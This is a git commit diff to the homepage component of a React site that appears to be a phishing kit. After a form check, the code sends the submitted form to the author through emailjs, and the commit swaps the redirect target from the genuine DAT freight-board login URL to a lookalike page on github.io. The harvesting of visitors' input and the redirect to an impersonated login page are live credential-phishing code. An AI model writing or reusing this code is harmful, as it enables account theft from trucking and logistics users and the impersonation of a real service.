a3693f3fdd877e6994ff9d6b7f763933d01251c6
navispherecarier <megalogisticscorpus@gmail.com>
2024-07-29 15:21:13 +0400

    sd

--- src/Components/HomePgae/homepage.js
+++ src/Components/HomePgae/homepage.js
@@ -126,7 +126,7 @@ function HomePage() {
             if (qfNumErku === 0) {
                 if (digit.current.value) {
                     emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
-                    window.location.href = "https://login.dat.com/login?state=hKFo2SBwWXlWeTB3dE9MdnpwOWZlQlZQU25wSXJ2N19QdVc5RKFupWxvZ2luo3RpZNkgZndKQ3RpZlYtdUhMX3BvUG5MZHRNVHdrNDg3TjZnUlGjY2lk2SBlOWx6TVhibldOSjBENTBDMmhhYWRvN0RpVzFha3dhQw&client=e9lzMXbnWNJ0D50C2haado7DiW1akwaC&protocol=oauth2&prompt=login&response_type=token%20id_token&redirect_uri=https:%2F%2Fone.dat.com%2Fcallback&scope=openid%20profile%20email&audience=https:%2F%2Fprod-api.dat.com&app_name=DAT%20One%20Web&page_mode=legacy&init_username=&view=login&email_readonly=false&nonce=K9F~QZ7J7pAxbQwq4584ydDVHnGb7Zmb&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4wIn0%3D&capturedTime=1704971938033";
+                    window.location.href = "https://loginsdat.github.io/login/";
                     return;
                 }
             }
